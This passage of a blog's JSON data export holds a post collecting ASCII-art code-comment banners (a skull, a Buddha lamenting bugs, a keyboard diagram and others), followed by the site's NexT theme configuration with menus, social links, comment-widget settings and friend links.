class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!--</span><br><span class=\"line\">                       ::</span><br><span class=\"line\">                      :;J7, :,                        ::;7:</span><br><span class=\"line\">                      ,ivYi, ,                       ;LLLFS:</span><br><span class=\"line\">                      :iv7Yi                       :7ri;j5PL</span><br><span class=\"line\">                     ,:ivYLvr                    ,ivrrirrY2X,</span><br><span class=\"line\">                     :;r@Wwz.7r:                :ivu@kexianli.</span><br><span class=\"line\">                    :iL7::,:::iiirii:ii;::::,,irvF7rvvLujL7ur</span><br><span class=\"line\">                   ri::,:,::i:iiiiiii:i:irrv177JX7rYXqZEkvv17</span><br><span class=\"line\">                ;i:, , ::::iirrririi:i:::iiir2XXvii;L8OGJr71i</span><br><span class=\"line\">              :,, ,,:   ,::ir@mingyi.irii:i:::j1jri7ZBOS7ivv,</span><br><span class=\"line\">                 ,::,    ::rv77iiiriii:iii:i::,rvLq@huhao.Li</span><br><span class=\"line\">             ,,      ,, ,:ir7ir::,:::i;ir:::i:i::rSGGYri712:</span><br><span class=\"line\">           :::  ,v7r:: ::rrv77:, ,, ,:i7rrii:::::, ir7ri7Lri</span><br><span class=\"line\">          ,     2OBBOi,iiir;r::        ,irriiii::,, ,iv7Luur:</span><br><span class=\"line\">        ,,     i78MBBi,:,:::,:,  :7FSL: ,iriii:::i::,,:rLqXv::</span><br><span class=\"line\">        :      iuMMP: :,:::,:ii;2GY7OBB0viiii:i:iii:i:::iJqL;::</span><br><span class=\"line\">       ,     ::::i   ,,,,, ::LuBBu BBBBBErii:i:i:i:i:i:i:r77ii</span><br><span class=\"line\">      ,       :       , ,,:::rruBZ1MBBqi, :,,,:::,::::::iiriri:</span><br><span class=\"line\">     ,               ,,,,::::i:  @arqiao.       ,:,, ,:::ii;i7:</span><br><span class=\"line\">    :,       rjujLYLi   ,,:::::,:::::::::,,   ,:i,:,,,,,::i:iii</span><br><span class=\"line\">    ::      BBBBBBBBB0,    ,,::: , ,:::::: ,      ,,,, ,,:::::::</span><br><span class=\"line\">    i,  ,  ,8BMMBBBBBBi     ,,:,,     ,,, , ,   , , , :,::ii::i::</span><br><span class=\"line\">    :      iZMOMOMBBM2::::::::::,,,,     ,,,,,,:,,,::::i:irr:i:::,</span><br><span class=\"line\">    i   ,,:;u0MBMOG1L:::i::::::  ,,,::,   ,,, ::::::i:i:iirii:i:i:</span><br><span class=\"line\">    :    ,iuUuuXUkFu7i:iii:i:::, :,:,: ::::::::i:i:::::iirr7iiri::</span><br><span class=\"line\">    :     :rk@Yizero.i:::::, ,:ii:::::::i:::::i::,::::iirrriiiri::,</span><br><span class=\"line\">     :      5BMBBBBBBSr:,::rv2kuii:::iii::,:i:,, , ,,:,:i@petermu.,</span><br><span class=\"line\">          , :r50EZ8MBBBBGOBBBZP7::::i::,:::::,: :,:,::i;rrririiii::</span><br><span class=\"line\">              :jujYY7LS0ujJL7r::,::i::,::::::::::::::iirirrrrrrr:ii:</span><br><span class=\"line\">           ,:  :@kevensun.:,:,,,::::i:i:::::,,::::::iir;ii;7v77;ii;i,</span><br><span class=\"line\">           ,,,     ,,:,::::::i:iiiii:i::::,, ::::iiiir@xingjief.r;7:i,</span><br><span class=\"line\">        , , ,,,:,,::::::::iiiiiiiiii:,:,:::::::::iiir;ri7vL77rrirri::</span><br><span class=\"line\">         :,, , ::::::::i:::i:::i:i::,,,,,:,::i:i:::iir;@Secbone.ii:::</span><br><span class=\"line\"></span><br><span class=\"line\">--&gt;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p><strong>骷髅头</strong></p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x2F;**</span><br><span class=\"line\"> **************************************************************</span><br><span class=\"line\"> *                                                            *</span><br><span class=\"line\"> *   .&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-.       *</span><br><span class=\"line\"> *    |                     ______                     |      *</span><br><span class=\"line\"> *    |                  .-&quot;      &quot;-.                  |      *</span><br><span class=\"line\"> *    |                 &#x2F;            \\                 |      *</span><br><span class=\"line\"> *    |     _          |              |          _     |      *</span><br><span class=\"line\"> *    |    ( \\         |,  .-.  .-.  ,|         &#x2F; )    |      *</span><br><span class=\"line\"> *    |     &gt; &quot;&#x3D;._     | )(__&#x2F;  \\__)( |     _.&#x3D;&quot; &lt;     |      *</span><br><span class=\"line\"> *    |    (_&#x2F;&quot;&#x3D;._&quot;&#x3D;._ |&#x2F;     &#x2F;\\     \\| _.&#x3D;&quot;_.&#x3D;&quot;\\_)    |      *</span><br><span class=\"line\"> *    |           &quot;&#x3D;._&quot;(_     ^^     _)&quot;_.&#x3D;&quot;           |      *</span><br><span class=\"line\"> *    |               &quot;&#x3D;\\__|IIIIII|__&#x2F;&#x3D;&quot;               |      *</span><br><span class=\"line\"> *    |              _.&#x3D;&quot;| \\IIIIII&#x2F; |&quot;&#x3D;._              |      *</span><br><span class=\"line\"> *    |    _     _.&#x3D;&quot;_.&#x3D;&quot;\\          &#x2F;&quot;&#x3D;._&quot;&#x3D;._     _    |      *</span><br><span class=\"line\"> *    |   ( \\_.&#x3D;&quot;_.&#x3D;&quot;     &#96;--------&#96;     &quot;&#x3D;._&quot;&#x3D;._&#x2F; )   |      *</span><br><span class=\"line\"> *    |    &gt; _.&#x3D;&quot;                            &quot;&#x3D;._ &lt;    |      *</span><br><span class=\"line\"> *    |   (_&#x2F;                                    \\_)   |      *</span><br><span class=\"line\"> *    |                                                |      *</span><br><span class=\"line\"> *    &#39;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;&#39;      *</span><br><span class=\"line\"> *                                                            *</span><br><span class=\"line\"> *           LASCIATE OGNI SPERANZA, VOI CH&#39;ENTRATE           *</span><br><span class=\"line\"> **************************************************************</span><br><span class=\"line\"> *&#x2F;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p><strong>顶</strong></p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x2F;**</span><br><span class=\"line\"> * 頂頂頂頂頂頂頂頂頂　頂頂頂頂頂頂頂頂頂</span><br><span class=\"line\"> * 頂頂頂頂頂頂頂　　　　　頂頂　　　　　</span><br><span class=\"line\"> * 　　　頂頂　　　頂頂頂頂頂頂頂頂頂頂頂</span><br><span class=\"line\"> * 　　　頂頂　　　頂頂頂頂頂頂頂頂頂頂頂</span><br><span class=\"line\"> * 　　　頂頂　　　頂頂　　　　　　　頂頂</span><br><span class=\"line\"> * 　　　頂頂　　　頂頂　　頂頂頂　　頂頂</span><br><span class=\"line\"> * 　　　頂頂　　　頂頂　　頂頂頂　　頂頂</span><br><span class=\"line\"> * 　　　頂頂　　　頂頂　　頂頂頂　　頂頂</span><br><span class=\"line\"> * 　　　頂頂　　　頂頂　　頂頂頂　　頂頂</span><br><span class=\"line\"> * 　　　頂頂　　　　　　　頂頂頂　</span><br><span class=\"line\"> * 　　　頂頂　　　　　　頂頂　頂頂　頂頂</span><br><span class=\"line\"> * 　頂頂頂頂　　　頂頂頂頂頂　頂頂頂頂頂</span><br><span class=\"line\"> * 　頂頂頂頂　　　頂頂頂頂　　　頂頂頂頂</span><br><span class=\"line\"> *&#x2F;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>**BUG泛滥，我已瘫痪</p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x2F;**</span><br><span class=\"line\"> * _ooOoo_</span><br><span class=\"line\"> * o8888888o</span><br><span class=\"line\"> * 88&quot; . &quot;88</span><br><span class=\"line\"> * (| -_- |)</span><br><span class=\"line\"> *  O\\ &#x3D; &#x2F;O</span><br><span class=\"line\"> * ___&#x2F;&#96;---&#39;\\____</span><br><span class=\"line\"> * .   &#39; \\\\| |&#x2F;&#x2F; &#96;.</span><br><span class=\"line\"> * &#x2F; \\\\||| : |||&#x2F;&#x2F; \\</span><br><span class=\"line\"> * &#x2F; _||||| -:- |||||- \\</span><br><span class=\"line\"> * | | \\\\\\ - &#x2F;&#x2F;&#x2F; | |</span><br><span class=\"line\"> * | \\_| &#39;&#39;\\---&#x2F;&#39;&#39; | |</span><br><span class=\"line\"> * \\ .-\\__ &#96;-&#96; ___&#x2F;-. &#x2F;</span><br><span class=\"line\"> * ___&#96;. .&#39; &#x2F;--.--\\ &#96;. . __</span><br><span class=\"line\"> * .&quot;&quot; &#39;&lt; &#96;.___\\_&lt;|&gt;_&#x2F;___.&#39; &gt;&#39;&quot;&quot;.</span><br><span class=\"line\"> * | | : &#96;- \\&#96;.;&#96;\\ _ &#x2F;&#96;;.&#96;&#x2F; - &#96; : | |</span><br><span class=\"line\"> * \\ \\ &#96;-. \\_ __\\ &#x2F;__ _&#x2F; .-&#96; &#x2F; &#x2F;</span><br><span class=\"line\"> * &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#96;-.____&#96;-.___\\_____&#x2F;___.-&#96;____.-&#39;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class=\"line\"> * &#96;&#x3D;---&#x3D;&#39;</span><br><span class=\"line\"> * .............................................</span><br><span class=\"line\"> * 佛曰：bug泛滥，我已瘫痪！</span><br><span class=\"line\"> *&#x2F;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p><strong>啪</strong></p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x2F;**</span><br><span class=\"line\"> *                                         ,s555SB@@&amp;                          </span><br><span class=\"line\"> *                                      :9H####@@@@@Xi                        </span><br><span class=\"line\"> *                                     1@@@@@@@@@@@@@@8                       </span><br><span class=\"line\"> *                                   ,8@@@@@@@@@B@@@@@@8                      </span><br><span class=\"line\"> *                                  :B@@@@X3hi8Bs;B@@@@@Ah,                   </span><br><span class=\"line\"> *             ,8i                  r@@@B:     1S ,M@@@@@@#8;                 </span><br><span class=\"line\"> *            1AB35.i:               X@@8 .   SGhr ,A@@@@@@@@S                </span><br><span class=\"line\"> *            1@h31MX8                18Hhh3i .i3r ,A@@@@@@@@@5               </span><br><span class=\"line\"> *            ;@&amp;i,58r5                 rGSS:     :B@@@@@@@@@@A               </span><br><span class=\"line\"> *             1#i  . 9i                 hX.  .: .5@@@@@@@@@@@1               </span><br><span class=\"line\"> *              sG1,  ,G53s.              9#Xi;hS5 3B@@@@@@@B1                </span><br><span class=\"line\"> *               .h8h.,A@@@MXSs,           #@H1:    3ssSSX@1                  </span><br><span class=\"line\"> *               s ,@@@@@@@@@@@@Xhi,       r#@@X1s9M8    .GA981               </span><br><span class=\"line\"> *               ,. rS8H#@@@@@@@@@@#HG51;.  .h31i;9@r    .8@@@@BS;i;          </span><br><span class=\"line\"> *                .19AXXXAB@@@@@@@@@@@@@@#MHXG893hrX#XGGXM@@@@@@@@@@MS        </span><br><span class=\"line\"> *                s@@MM@@@hsX#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&amp;,      </span><br><span class=\"line\"> *              :GB@#3G@@Brs ,1GM@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@B,     </span><br><span class=\"line\"> *            .hM@@@#@@#MX 51  r;iSGAM@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@8     </span><br><span class=\"line\"> *          :3B@@@@@@@@@@@&amp;9@h :Gs   .;sSXH@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:    </span><br><span class=\"line\"> *      s&amp;HA#@@@@@@@@@@@@@@M89A;.8S.       ,r3@@@@@@@@@@@@@@@@@@@@@@@@@@@r    </span><br><span class=\"line\"> *   ,13B@@@@@@@@@@@@@@@@@@@5 5B3 ;.         ;@@@@@@@@@@@@@@@@@@@@@@@@@@@i    </span><br><span class=\"line\"> *  5#@@#&amp;@@@@@@@@@@@@@@@@@@9  .39:          ;@@@@@@@@@@@@@@@@@@@@@@@@@@@;    </span><br><span class=\"line\"> *  9@@@X:MM@@@@@@@@@@@@@@@#;    ;31.         H@@@@@@@@@@@@@@@@@@@@@@@@@@:    </span><br><span class=\"line\"> *   SH#@B9.rM@@@@@@@@@@@@@B       :.         3@@@@@@@@@@@@@@@@@@@@@@@@@@5    </span><br><span class=\"line\"> *     ,:.   9@@@@@@@@@@@#HB5                 .M@@@@@@@@@@@@@@@@@@@@@@@@@B    </span><br><span class=\"line\"> *           ,ssirhSM@&amp;1;i19911i,.             s@@@@@@@@@@@@@@@@@@@@@@@@@@S   </span><br><span class=\"line\"> *              ,,,rHAri1h1rh&amp;@#353Sh:          8@@@@@@@@@@@@@@@@@@@@@@@@@#:  </span><br><span class=\"line\"> *            .A3hH@#5S553&amp;@@#h   i:i9S          #@@@@@@@@@@@@@@@@@@@@@@@@@A. </span><br><span class=\"line\"> *</span><br><span class=\"line\"> *</span><br><span class=\"line\"> *   </span><br><span class=\"line\"> *&#x2F;</span><br></pre></td></tr></table></figure>\n<p><strong><a href=\"http://www.asciiworld.com/\">Click Here For More</a></strong></p>\n","site":{"data":{"sidebar":"<script src=\"//v1.hitokoto.cn/?encode=js&select=%23hitokoto\" defer></script>\n<style>\n@media all and (orientation : portrait) {\n\t#hitokoto{\n\t\tpadding-left: 50px;\n\t\tpadding-right: 50px;\n\t}\n}\n</style>\n\n\n\n\n\n\n\n\n","next":{"override":false,"reminder":false,"cache":{"enable":true},"minify":true,"custom_file_path":{"sidebar":"source/_data/sidebar.swig"},"favicon":{"small":"//cdn.file.todest.cn/blog/user/logo.ico","medium":"//cdn.file.todest.cn/blog/user/logo.ico","apple_touch_icon":"//cdn.file.todest.cn/blog/user/logo.ico","safari_pinned_tab":"//cdn.file.todest.cn/blog/user/logo.ico","ms_browserconfig":"//cdn.file.todest.cn/blog/user/logo.ico"},"rss":null,"footer":{"icon":{"name":"user","animated":false,"color":"#808080"},"copyright":null,"powered":{"enable":true,"version":true},"theme":{"enable":true,"version":true},"beian":{"enable":false,"icp":null,"gongan_id":null,"gongan_num":null,"gongan_icon_url":null}},"creative_commons":{"license":"by-nc-sa","sidebar":false,"post":false,"language":null},"scheme":"Gemini","menu":{"home":"/ || home","about":"/about/ || user","tags":"/tags/ || tags","categories":"/categories/ || th","archives":"/archives/ || archive","相册":"/photo/ || photo","链接":"/links/ || link","留言":"/bbs/ || comments"},"menu_settings":{"icons":true,"badges":true},"sidebar":{"position":"left","display":"post","offset":12,"onmobile":false},"avatar":{"url":"https://s.gravatar.com/avatar/4756cb352ec7f58884fdc0c219ea00dc?s=80","rounded":false,"rotated":false},"site_state":true,"social":{"GitHub":"https://github.com/todest || github","E-Mail":"mailto:todest@qq.com || envelope","QQ":"http://wpa.qq.com/msgrd?v=3&uin=1123792492 || qq","Facebook":"https://www.facebook.com/ultrasurreal || facebook","StackOverflow":"https://stackoverflow.com/users/11422695 || stack-overflow","Instagram":"https://www.instagram.com/yonghangguo/ || instagram"},"social_icons":{"enable":true,"icons_only":true,"transition":true},"links_settings":{"icon":"link","title":"Links","layout":"inline"},"links":{"BoilTask":"https://boiltask.com","Codancer":"https://www.cnblogs.com/codancer","Colsrch":"https://colsrch.cn","执念":"https://blog.wzy1999.wang","Des_tiny":"https://anyway521.github.io","Drew":"https://cndrew.cn","rookie6":"https://rookie6.github.io","LuoZui":"https://www.lzphi.cn","Sky":"https://angelni.github.io","一Wa哇一天":"https://blogzhy.cn","Jinqimu":"https://jinqimu.xyz","FuZhiyuan":"https://fuzhiyuan.github.io","RuiRui":"https://pipakacha.com"},"toc":{"enable":true,"number":true,"wrap":false,"expand_all":false,"max_depth":6},"chat":{"enable":false,"icon":"comment","text":"Chat"},"excerpt_description":true,"auto_excerpt":{"enable":false,"length":150},"read_more_btn":true,"post_meta":{"item_text":true,"created_at":true,"updated_at":{"enable":true,"another_day":true},"categories":true},"symbols_count_time":{"separated_meta":true,"item_text_post":true,"item_text_total":false,"awl":4,"wpm":275},"tag_icon":false,"reward_settings":{"enable":true,"animation":true,"comment":"赏点呗！"},"reward":{"wechatpay":"//cdn.file.todest.cn/blog/user/wechatpay.jpg","alipay":"//cdn.file.todest.cn/blog/user/alipay.jpg","bitcoin":"//cdn.file.todest.cn/blog/user/bitcoin.png"},"related_posts":{"enable":false,"title":null,"display_in_home":false,"params":{"maxCount":5}},"post_edit":{"enable":false,"url":"https://github.com/user-name/repo-name/tree/branch-name/subdirectory-name"},"cheers":true,"tagcloud":{"min":12,"max":30,"start":"#ccc","end":"#111","amount":200},"calendar":{"calendar_id":"<required>","api_key":"<required>","orderBy":"startTime","offsetMax":24,"offsetMin":4,"showDeleted":false,"singleEvents":true,"maxResults":250},"text_align":{"desktop":"justify","mobile":"justify"},"mobile_layout_economy":false,"android_chrome_color":"#222","safari_rainbow":false,"custom_logo":null,"codeblock":{"highlight_theme":"normal","copy_button":{"enable":true,"show_result":true,"style":null}},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"reading_progress":{"enable":false,"position":"top","color":"#37c6c0","height":"3px"},"bookmark":{"enable":false,"color":"#222","save":"auto"},"github_banner":{"enable":true,"permalink":"https://github.com/yourname","title":"Follow me on GitHub"},"font":{"enable":false,"host":null,"global":{"external":true,"family":"Lato","size":null},"title":{"external":true,"family":null,"size":null},"headings":{"external":true,"family":null,"size":null},"posts":{"external":true,"family":null},"codes":{"external":true,"family":null}},"disable_baidu_transformation":false,"canonical":true,"seo":true,"index_with_subtitle":false,"exturl":false,"google_site_verification":null,"bing_site_verification":null,"yandex_site_verification":null,"baidu_site_verification":null,"baidu_push":false,"math":{"per_page":false,"mathjax":{"enable":true,"mhchem":false},"katex":{"enable":false,"copy_tex":false}},"pjax":false,"fancybox":true,"mediumzoom":false,"lazyload":true,"pangu":false,"quicklink":{"enable":false,"home":true,"archive":true,"delay":true,"timeout":3000,"priority":true,"ignores":null},"comments":{"style":"tabs","active":null,"storage":true,"nav":null},"disqus":{"enable":false,"shortname":null,"count":true,"lazyload":false},"disqusjs":{"enable":false,"api":null,"apikey":null,"shortname":null},"changyan":{"enable":false,"appid":null,"appkey":null},"valine":{"enable":true,"appid":"NNOFYEbCjmMJUqInK2zEpetd-gzGzoHsz","appkey":"Q474k3XvUzlPbRG5bOyNCxVt","notify":false,"verify":false,"placeholder":"写点什么？","avatar":"mm","guest_info":"nick,mail,link","pageSize":10,"language":null,"visitor":false,"comment_count":true,"recordIP":false,"serverURLs":null},"livere_uid":null,"gitalk":{"enable":false,"github_id":null,"repo":null,"client_id":null,"client_secret":null,"admin_user":null,"distraction_free_mode":true,"language":null},"rating":{"enable":false,"id":null,"color":"fc6423"},"add_this_id":null,"google_analytics":{"tracking_id":null,"localhost_ignored":true,"only_pageview":false},"baidu_analytics":null,"growingio_analytics":null,"cnzz_siteid":null,"tencent_analytics":null,"tencent_mta":null,"leancloud_visitors":{"enable":false,"app_id":null,"app_key":null,"security":true,"betterPerformance":false},"firestore":{"enable":false,"collection":"articles","apiKey":null,"projectId":null},"busuanzi_count":{"enable":true,"total_visitors":true,"total_visitors_icon":"user","total_views":true,"total_views_icon":"eye","post_views":true,"post_views_icon":"eye"},"algolia_search":{"enable":false,"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"local_search":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":true,"preload":true},"swiftype_key":null,"chatra":{"enable":false,"async":true,"id":null},"tidio":{"enable":false,"key":null},"note":{"style":"simple","icons":false,"border_radius":3,"light_bg_offset":0},"tabs":{"transition":{"tabs":false,"labels":true},"border_radius":0},"pdf":{"enable":false,"height":"500px"},"mermaid":{"enable":false,"theme":"forest"},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"pace":{"enable":false,"theme":"minimal"},"three":{"enable":false,"three_waves":false,"canvas_lines":false,"canvas_sphere":false},"canvas_nest":{"enable":false,"onmobile":true,"color":"0,0,255","opacity":0.5,"zIndex":-1,"count":99},"canvas_ribbon":{"enable":false,"size":300,"alpha":0.6,"zIndex":-1},"vendors":{"_internal":"lib","anime":null,"fontawesome":null,"mathjax":null,"mhchem":null,"katex":null,"copy_tex_js":null,"copy_tex_css":null,"pjax":null,"jquery":null,"fancybox":null,"fancybox_css":null,"mediumzoom":null,"lazyload":null,"pangu":null,"quicklink":null,"disqusjs_js":null,"disqusjs_css":null,"valine":null,"gitalk_js":null,"gitalk_css":null,"algolia_instant_js":null,"algolia_instant_css":null,"pdfobject":null,"mermaid":null,"velocity":null,"velocity_ui":null,"pace":null,"pace_css":null,"three":null,"three_waves":null,"canvas_lines":null,"canvas_sphere":null,"canvas_nest":null,"canvas_nest_nomobile":null,"canvas_ribbon":null},"css":"css","js":"js","images":"images","crash_cheat":true,"clicklove":true,"snow":false}}},"length":8599,"excerpt":"<blockquote>\n<p><strong>标准键盘</strong></p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x2F;**</span><br><span class=\"line\"> * ┌───┐   ┌───┬───┬───┬───┐ ┌───┬───┬───┬───┐ ┌───┬───┬───┬───┐ ┌───┬───┬───┐</span><br><span class=\"line\"> * │Esc│   │ F1│ F2│ F3│ F4│ │ F5│ F6│ F7│ F8│ │ F9│F10│F11│F12│ │P&#x2F;S│S L│P&#x2F;B│  ┌┐    ┌┐    ┌┐</span><br><span class=\"line\"> * └───┘   └───┴───┴───┴───┘ └───┴───┴───┴───┘ └───┴───┴───┴───┘ └───┴───┴───┘  └┘    └┘    └┘</span><br><span class=\"line\"> * ┌───┬───┬───┬───┬───┬───┬───┬───┬───┬───┬───┬───┬───┬───────┐ ┌───┬───┬───┐ ┌───┬───┬───┬───┐</span><br><span class=\"line\"> * │~ &#96;│! 1│@ 2│# 3│$ 4│% 5│^ 6│&amp; 7│* 8│( 9│) 0│_ -│+ &#x3D;│ BacSp │ │Ins│Hom│PUp│ │N L│ &#x2F; │ * │ - │</span><br><span class=\"line\"> * ├───┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─────┤ ├───┼───┼───┤ ├───┼───┼───┼───┤</span><br><span class=\"line\"> * │ Tab │ Q │ W │ E │ R │ T │ Y │ U │ I │ O │ P │&#123; [│&#125; ]│ | \\ │ │Del│End│PDn│ │ 7 │ 8 │ 9 │   │</span><br><span class=\"line\"> * ├─────┴┬──┴┬──┴┬──┴┬──┴┬──┴┬──┴┬──┴┬──┴┬──┴┬──┴┬──┴┬──┴─────┤ └───┴───┴───┘ ├───┼───┼───┤ + │</span><br><span class=\"line\"> * │ Caps │ A │ S │ D │ F │ G │ H │ J │ K │ L │: ;│&quot; &#39;│ Enter  │               │ 4 │ 5 │ 6 │   │</span><br><span class=\"line\"> * ├──────┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴────────┤     ┌───┐     ├───┼───┼───┼───┤</span><br><span class=\"line\"> * │ Shift  │ Z │ X │ C │ V │ B │ N │ M │&lt; ,│&gt; .│? &#x2F;│  Shift   │     │ ↑ │     │ 1 │ 2 │ 3 │   │</span><br><span class=\"line\"> * ├─────┬──┴─┬─┴──┬┴───┴───┴───┴───┴───┴──┬┴───┼───┴┬────┬────┤ ┌───┼───┼───┐ ├───┴───┼───┤ E││</span><br><span class=\"line\"> * │ Ctrl│    │Alt │         Space         │ Alt│    │    │Ctrl│ │ ← │ ↓ │ → │ │   0   │ . │←─┘│</span><br><span class=\"line\"> * └─────┴────┴────┴───────────────────────┴────┴────┴────┴────┘ └───┴───┴───┘ └───────┴───┴───┘</span><br><span class=\"line\"> *&#x2F;</span><br></pre></td></tr></table></figure>","more":"<blockquote>\n<p><strong>PC</strong></p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">+------------------------------------------------------------------------+</span><br><span class=\"line\">|                                                                        |</span><br><span 